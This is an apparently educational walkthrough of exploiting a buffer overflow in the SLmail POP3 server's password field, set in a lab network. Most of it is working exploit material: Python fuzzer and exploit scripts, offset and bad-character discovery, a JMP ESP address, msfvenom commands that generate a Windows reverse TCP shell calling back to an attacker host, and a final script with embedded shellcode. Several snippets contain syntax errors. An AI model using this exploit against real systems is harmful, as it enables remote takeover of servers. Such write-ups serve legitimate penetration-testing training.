# Fuzz SLmail
We can easily create a fuzzer with the Python language, we know SLmail is a POP3 server, so he will open a network port (110) and respond to us on this port.
That why we can create a script, who goes open a socket and send a login attempt to SLmail on port 110. And, we going to do that till the server respond to us, if the server stop to communicate with us, that will say we made crashed the SLmail application.
First, we create a socket with the python library “socket”, we generate your buffer, then we send this buffer to our target. POP3 protocol allow login with a username and a password, in this example we “fuzz” the password step.
#### Python fuzzer:
```python
#!/usr/bin/env python
import socket
import sys

buffer = ["A"]
counter = 100
while len(buffer) <= 30:
  buffer.append("A" * counter)
  counter = counter + 200

for string in buffer:
  print "[*] Fuzzing PASSWORD field with %s bytes" % len(string)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect = s.connect(“10.11.5.65”, 110))
  s.recv(1024)
  s.send('USER offsec\r\n')
  s.recv(1024)
  s.send('PASS' + string + '\r\n')
  s.send('QUIT\r\n')
  s.close()
 ```
To understand what happens we can open a debugger like "Immunity debugger" [1] and attach the Slmail process to this debugger.
Now we start the fuzzer:
![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/006.png)

And as we can see, the application crash when we try to send a password of 2700 bytes’ length.
Immunity debugger say the same thing (more clearly):

![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/007.png)

Here the EIP Register point to the 41414141 offset, but this memory address doesn’t exist, so the application crash. And when we follow the dump in memory we can see what happens.
Memory hex dump: 

![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/004.png)

We can see all our “A” send previously with our fuzzer, we “overwrite data” with our fuzzer.
# Buffer Overflow Exploitation
After our fuzzing test, we know the application crash with 2700 bytes of data, so we can replicate the crash with a standalone Python script.

#### Standalone script:
```python
#!/usr/bin/env python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2700

try:
  print "[*] Sending evil buffer ..."
  print "[*] %s bytes to 10.11.5.65" % len(buffer)
  s.connect(('10.11.5.65', 110))
  data = s.recv(1024)
  s.send('USER offsec +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "[*] Down!"

except:
  print "[*] Could not connect to POP3"
```
Here we create a buffer of 2700 bytes’ length. But if we look at the EIP offset after the execution of this script we have only ‘A’, so we can’t determine in which exact offset the application crash, that can be before 2700. 
To exactly determine the exact buffer length to made crash the application and find the EIP offset, we can use two scripts from the Metapsloit-Framework project. The pattern_create.rb script and the pattern_offset.rb script.

```
root@kali:~# cd /usr/share/metasploit-framework/tools/exploit/
root@kali:/usr/share/metasploit-framework/tools/exploit# ls 
egghunter.rb     find_badchars.rb      metasm_shell.rb   pattern_create.rb  reg.rb
exe2vba.rb       install_msf_apk.sh    msf_irb_shell.rb  pattern_offset.rb  virustotal.rb
exe2vbs.rb       java_deserializer.rb  msu_finder.rb     pdf2xdp.rb
extract_msu.bat  jsobfu.rb             nasm_shell.rb     psexec.rb
root@kali:/usr/share/metasploit-framework/tools/exploit#
```
First, pattern_create.rb help us to create a custom unique byte string with a specific length. 
```
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 2700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0A
...
```
With this buffer, we can have next time a different value between ESP and EIP. And use the EIP offset after the crash to determine with the pattern_offset.rb script the four bytes in our unique byte string.

![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/008.png)

And voilà! EIP and ESP is different. We can get the EIP offset and use it with the second script.
```
root@kali:/usr/share/metasploit-framework/tools/exploit# pattern_offset.rb -l 2700 -q 39694438
[*] Exact match at offset 2606
root@kali:~/Desktop#
```
Now we can update our previous script with a custom string to place a unique value into EIP, to ensure our offset is correct.

#### Update on byte string: 
```python
#!/usr/bin/env python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" *2606 +”B” *4 +”C”*90

try:
  print "[*] Sending evil buffer ..."
  print "[*] %s bytes to 10.11.5.65" % len(buffer)
  s.connect(('10.11.5.65', 110))
  data = s.recv(1024)
  s.send('USER rekt' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "[*] Down!"

except:
  print "[*] Could not connect to POP3"
```
### Checking for bad characters 
“Depending on the application, vulnerability type, and protocols in use, there may be certain characters that are considered “bad” and should not be used in your buffer, return address, or shellcode.” 
That why we must update one more type our script to check for “bad“ characters to avoid in our byte string. For that we can create a string with all hexadecimal possibilities between \x00 and \xff, such as:

```python
badchars = ( 
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = “A” *2606 +”B” *4 + badchars
...
```
![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/001.png)

And as we can see \x0a is a bad character. Because we jump from \x09 to \x29. So, we can remove from our bad chars list \x0a and repeat this process till, we find weird information in memory dump.
After all, we find \x00 \x0a and \x0d.
This bad characters is predictable because if we translate from hexadecimal to ASCII, we get that
-	\x00  -->  null byte (use to terminate a string copy operation)
-	\x0a  -->  \n (linefeed)
-	\x0d  -->  \r (carriage return)

All this characters will truncate our buffer.

### Redirecting the Execution flow 
Our next task is finding a way to redirect the execution flow to the shellcode located at the memory address that the ESP register is pointing to, at crash time. We need to find a way to overwrite EIP with the address that pops up in the ESP register. That why our work is to find a reliable address in memory that contains an instruction such as JMP ESP. For that we can use the mona.py script.
First, we can list all modules available on the current process with this command:
```
!mona modules
```
We will need to make sure to choose a module with the following criteria:
-	No memory protection such as ASLR [2] and DEP [3] present;
-	Has a memory range that does not contain bad characters.

![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/005.png)

The mona.py script has identified the SLMCF.DLL as not being affected by any memory protection schemes, as well as not being rebased on each reboot. This means that this DLL will always reliably load to the same address. Now, we need to find a naturally occurring JMP ESP (or equivalent) instruction within this DLL, and identify at what address this instruction is located.
As we know this application is not compiled with DEP support, so we are free to use instruction from any address in this module, not only on the .text segment. For that we can use one more time mona, to search for a \xff\xe4 a.k.a JMP ESP in the slmfc.dll module.
```
!mona find -s “\xff\xe4” -m slmfc.dll
```
![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/003.png)

Mona give to us different possibilities, and we choose one which does not contain bad characters. So, we can take 0x5f4a358f, go on it, and put a break point (with F2) on this specific offset.

![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/002.png)

Now we can modify our buffer with this specific address, that will at the time of the crash, execute a JMP ESP instruction. Note, in the x86 architecture, addresses are stores in little endian format [4], where the low-order byte of the number is stored in memory at the lowest address, and the highest byte at the highest address.
#### Update of the buffer:
```
buffer = “A” *2606 +”\x8f\x35\x4a\5f” +”C” *390
...
```

### Getting a Shell
Now, we need to generate a shellcode [5], this shellcode will be executed after the JMP ESP instruction. For that we can use a very powerful tool, on again, from the Metasploit-framework project, msfvenom [6].
This following command let us create a simple windows reverse TCP shell:
```
root@kali:~/Desktop# msfvenom -a x86 -e x86/shikata_ga_nai --platform windows -p windows/shell_reverse_tcp LPORT=31337 LHOST=10.11.0.147 -b '\x00\x0a\x0d' -f c -o shellcode.c 
```
Let's explain a bit this command:
-	-a used to specify the architecture, here x86 (32 bits);
-	-e used to specify an encoder, here polymorphic XOR additive feedback encoder x86/shikata_ga_nai;
-	--platform used to specify a platform, Windows, Linux, and so one;
-	-p used to specify the payload [7] we want to use, here windows/shell_reverse_tcp ;
-	LPORT used to specify the local port;
-	LHOST used to specify the local IP address;
-	-b used to specify which characters we want to remove;
-	-f used to specify the output format;
-	-o used to output on a specific file.

Now with this payload, we can add it to our script to send it to the target.
Now we can get a shell. However, since the ESP register points to the beginning of our payload, the Metasploit-Framework decoder will step on its toes, by overwriting the first few bytes of our shellcode, rendering it useless. We can avoid this issue by adding few No Operation (NOP) instructions (0x90) at the beginning of our shellcode. 

#### Update of our script:
```python
#!/usr/bin/env python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = (
"\xdb\xc7\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x52\xbe\x47\xb5\x27"
"\x44\x31\x70\x17\x03\x70\x17\x83\xaf\x49\xc5\xb1\xd3\x5a\x88"
"\x3a\x2b\x9b\xed\xb3\xce\xaa\x2d\xa7\x9b\x9d\x9d\xa3\xc9\x11"
"\x55\xe1\xf9\xa2\x1b\x2e\x0e\x02\x91\x08\x21\x93\x8a\x69\x20"
"\x17\xd1\xbd\x82\x26\x1a\xb0\xc3\x6f\x47\x39\x91\x38\x03\xec"
"\x05\x4c\x59\x2d\xae\x1e\x4f\x35\x53\xd6\x6e\x14\xc2\x6c\x29"
"\xb6\xe5\xa1\x41\xff\xfd\xa6\x6c\x49\x76\x1c\x1a\x48\x5e\x6c"
"\xe3\xe7\x9f\x40\x16\xf9\xd8\x67\xc9\x8c\x10\x94\x74\x97\xe7"
"\xe6\xa2\x12\xf3\x41\x20\x84\xdf\x70\xe5\x53\x94\x7f\x42\x17"
"\xf2\x63\x55\xf4\x89\x98\xde\xfb\x5d\x29\xa4\xdf\x79\x71\x7e"
"\x41\xd8\xdf\xd1\x7e\x3a\x80\x8e\xda\x31\x2d\xda\x56\x18\x3a"
"\x2f\x5b\xa2\xba\x27\xec\xd1\x88\xe8\x46\x7d\xa1\x61\x41\x7a"
"\xc6\x5b\x35\x14\x39\x64\x46\x3d\xfe\x30\x16\x55\xd7\x38\xfd"
"\xa5\xd8\xec\x52\xf5\x76\x5f\x13\xa5\x36\x0f\xfb\xaf\xb8\x70"
"\x1b\xd0\x12\x19\xb6\x2b\xf5\x2c\x4c\x33\x96\x59\x50\x33\xe2"
"\xf0\xdd\xd5\x78\x13\x88\x4e\x15\x8a\x91\x04\x84\x53\x0c\x61"
"\x86\xd8\xa3\x96\x49\x29\xc9\x84\x3e\xd9\x84\xf6\xe9\xe6\x32"
"\x9e\x76\x74\xd9\x5e\xf0\x65\x76\x09\x55\x5b\x8f\xdf\x4b\xc2"
"\x39\xfd\x91\x92\x02\x45\x4e\x67\x8c\x44\x03\xd3\xaa\x56\xdd"
"\xdc\xf6\x02\xb1\x8a\xa0\xfc\x77\x65\x03\x56\x2e\xda\xcd\x3e"
"\xb7\x10\xce\x38\xb8\x7c\xb8\xa4\x09\x29\xfd\xdb\xa6\xbd\x09"
"\xa4\xda\x5d\xf5\x7f\x5f\x7d\x14\x55\xaa\x16\x81\x3c\x17\x7b"
"\x32\xeb\x54\x82\xb1\x19\x25\x71\xa9\x68\x20\x3d\x6d\x81\x58"
"\x2e\x18\xa5\xcf\x4f\x09")

buffer = "A" * 2606 +"\x8f\x35\x4a\x5f" +"\x90"*16 +shellcode

try:
  print "[*] Sending evil buffer ..."
  print "[*] %s bytes to 10.11.5.65" % len(buffer)
  s.connect(('10.11.5.65', 110))
  data = s.recv(1024)
  s.send('USER rekt' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "[*] Down!"

except:
  print "[*] Could not connect to POP3"
```
### WE GET A SHELL!
![](https://raw.githubusercontent.com/amonsec/CVE/master/slmail/utiles/009.png)

#### Improving the Exploit
Now we have a new problem that we can patch. When using default Metasploit-Framework shellcode, the default exit method the shellcode uses, at the end of shellcode execution, is the ExitProcess. This exit method will shut down the whole mail service process, effectively killing the SLMail service, and causing it to crash. 
We can use the EXITFUNC=thread options during the payload generation with msfvenom to exit only the current thread, because SLmail support and use threads.

```
root@kali:~/Desktop# msfvenom -a x86 -e x86/shikata_ga_nai --platform windows -p windows/shell_reverse_tcp LPORT=31337 LHOST=10.11.0.147 -b '\x00\x0a\x0d' EXITFUNC=thread -f c -o shellcode.c 
```

# ʕ •ᴥ•ʔ
[1] https://www.immunityinc.com/products/debugger/
[2]  https://en.wikipedia.org/wiki/Address_space_layout_randomization
[3] https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003
[4] https://en.wikipedia.org/wiki/Endianness
[5] https://en.wikipedia.org/wiki/Shellcode
[6] https://www.offensive-security.com/metasploit-unleashed/msfvenom/
[7] https://en.wikipedia.org/wiki/Payload_(computing)


